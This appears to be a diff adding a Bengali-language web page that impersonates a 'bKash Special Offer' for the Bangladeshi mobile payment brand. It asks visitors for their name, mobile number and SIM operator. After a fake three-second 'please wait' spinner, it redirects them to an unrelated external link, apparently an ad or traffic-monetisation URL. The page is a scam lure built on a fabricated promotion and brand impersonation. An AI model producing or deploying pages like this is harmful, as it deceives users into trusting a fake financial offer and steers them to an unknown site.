@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>bKash Special Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #fce4ec, #f8bbd0);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .card h1 {
+      color: #e2136e;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      text-align: left;
+      margin-bottom: 18px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 6px;
+      color: #444;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .sim-select {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .sim-option {
+      flex: 1 1 45%;
+      padding: 10px 0;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      text-align: center;
+      cursor: pointer;
+      background-color: #fafafa;
+    }
+
+    .sim-option.selected {
+      border-color: #e2136e;
+      background-color: #ffe6f0;
+      font-weight: bold;
+    }
+
+    .btn {
+      margin-top: 20px;
+      padding: 14px;
+      width: 100%;
+      background-color: #e2136e;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #c0115c;
+    }
+
+    .message {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #444;
+      display: none;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #e2136e;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-left: 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .sim-option {
+        flex: 1 1 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>📱 বিকাশ স্পেশাল অফার</h1>
+
+    <div class="input-group">
+      <label for="name">নাম</label>
+      <input type="text" id="name" placeholder="আপনার নাম লিখুন" />
+    </div>
+
+    <div class="input-group">
+      <label for="phone">মোবাইল নাম্বার</label>
+      <input type="tel" id="phone" placeholder="01XXXXXXXXX" />
+    </div>
+
+    <div class="input-group">
+      <label>সিম অপারেটর</label>
+      <div class="sim-select">
+        <div class="sim-option">GP</div>
+        <div class="sim-option">Robi</div>
+        <div class="sim-option">Banglalink</div>
+        <div class="sim-option">Teletalk</div>
+      </div>
+    </div>
+
+    <button class="btn" id="shareButton">✅ অফার শেয়ার করুন</button>
+    <div class="message" id="message">অনুগ্রহ করে অপেক্ষা করুন...<span class="loader"></span></div>
+    <div class="error" id="error"></div>
+  </div>
+
+  <script>
+    const simOptions = document.querySelectorAll('.sim-option');
+    const shareButton = document.getElementById('shareButton');
+    const message = document.getElementById('message');
+    const error = document.getElementById('error');
+
+    simOptions.forEach(option => {
+      option.addEventListener('click', () => {
+        simOptions.forEach(o => o.classList.remove('selected'));
+        option.classList.add('selected');
+      });
+    });
+
+    shareButton.addEventListener('click', () => {
+      const name = document.getElementById('name').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const selectedSim = document.querySelector('.sim-option.selected');
+
+      // Validation
+      if (!name || !phone || !selectedSim) {
+        error.textContent = 'অনুগ্রহ করে সব তথ্য দিন।';
+        return;
+      }
+
+      if (!/^01[0-9]{9}$/.test(phone)) {
+        error.textContent = 'সঠিক মোবাইল নাম্বার দিন (১১ ডিজিট, 01 দিয়ে শুরু)।';
+        return;
+      }
+
+      error.textContent = '';
+      message.style.display = 'block';
+
+      setTimeout(() => {
+        window.location.href = 'https://otieu.com/4/9479478';
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
